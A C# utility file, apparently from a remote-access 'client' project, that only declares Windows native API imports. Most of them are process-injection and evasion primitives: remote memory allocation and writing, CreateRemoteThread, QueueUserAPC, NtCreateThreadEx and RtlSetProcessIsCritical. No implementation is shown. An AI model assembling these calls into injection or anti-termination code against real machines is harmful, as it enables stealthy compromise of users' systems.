using System;
using System.Runtime.InteropServices;
using Models;

namespace newClient.Utilities;

public class NativeInvoke
{
	[DllImport("Dnsapi.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool DnsFlushResolverCache();

	[DllImport("kernel32.dll")]
	public static extern IntPtr OpenMutexA(uint dwDesiredAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, [In][MarshalAs(UnmanagedType.LPStr)] string lpName);

	[DllImport("kernel32.dll")]
	public static extern IntPtr CreateMutexA([In] IntPtr lpMutexAttributes, [MarshalAs(UnmanagedType.Bool)] bool bInitialOwner, [In][MarshalAs(UnmanagedType.LPStr)] string lpName);

	[DllImport("kernel32.dll")]
	public static extern void GetSystemInfo(out SYSTEM_INFO lpSystemInfo);

	[DllImport("kernel32.dll")]
	public static extern int VirtualQueryEx(IntPtr hProcess, IntPtr lpAddress, out MEMORY_BASIC_INFORMATION lpBuffer, uint dwLength);

	[DllImport("kernel32.dll")]
	public static extern bool VirtualProtect(IntPtr lpAddress, IntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

	[DllImport("kernel32.dll", SetLastError = true)]
	public static extern IntPtr OpenProcess(ProcessAccessFlags dwDesiredAccess, bool bInheritHandle, int dwProcessId);

	[DllImport("ntdll.dll")]
	public static extern int NtQueryInformationProcess(IntPtr ProcessHandle, int ProcessInformationClass, IntPtr ProcessInformation, int ProcessInformationLength, ref int ReturnLength);

	[DllImport("kernel32.dll", SetLastError = true)]
	public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, IntPtr lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

	[DllImport("kernel32.dll")]
	public static extern IntPtr GetModuleHandle(string lpModuleName);

	[DllImport("ntdll.dll", SetLastError = true)]
	public static extern void RtlSetProcessIsCritical(uint v1, uint v2, uint v3);

	[DllImport("kernel32.dll", SetLastError = true)]
	public static extern EXECUTION_STATE SetThreadExecutionState(EXECUTION_STATE esFlags);

	[DllImport("advapi32.dll")]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool OpenProcessToken([In] IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

	[DllImport("advapi32.dll")]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool GetTokenInformation([In] IntPtr TokenHandle, uint TokenInformationClass, IntPtr TokenInformation, uint TokenInformationLength, out IntPtr ReturnLength);

	[DllImport("advapi32.dll")]
	public static extern IntPtr GetSidSubAuthorityCount([In] IntPtr pSid);

	[DllImport("advapi32.dll")]
	public static extern IntPtr GetSidSubAuthority([In] IntPtr pSid, uint nSubAuthority);

	[DllImport("kernel32.dll")]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool CloseHandle([In] IntPtr hObject);

	[DllImport("kernel32.dll", SetLastError = true)]
	public static extern uint ResumeThread(IntPtr hThread);

	[DllImport("kernel32.dll")]
	public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

	[DllImport("kernel32.dll")]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFOEX lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

	[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, int dwSize, int flAllocationType, int flProtect);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern bool VirtualFreeEx(IntPtr hProcess, IntPtr lpAddress, IntPtr dwSize, IntPtr dwFreeType);

	[DllImport("kernel32.dll")]
	public static extern IntPtr QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);

	[DllImport("kernel32.dll", SetLastError = true)]
	public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, ref int lpNumberOfBytesWritten);

	[DllImport("ntdll.dll", SetLastError = true)]
	public static extern int NtCreateThreadEx(out IntPtr threadHandle, int desiredAccess, IntPtr objectAttributes, IntPtr processHandle, IntPtr startAddress, IntPtr parameter, bool createSuspended, uint stackZeroBits, uint sizeOfStackCommit, uint sizeOfStackReserve, IntPtr parameter2);
}
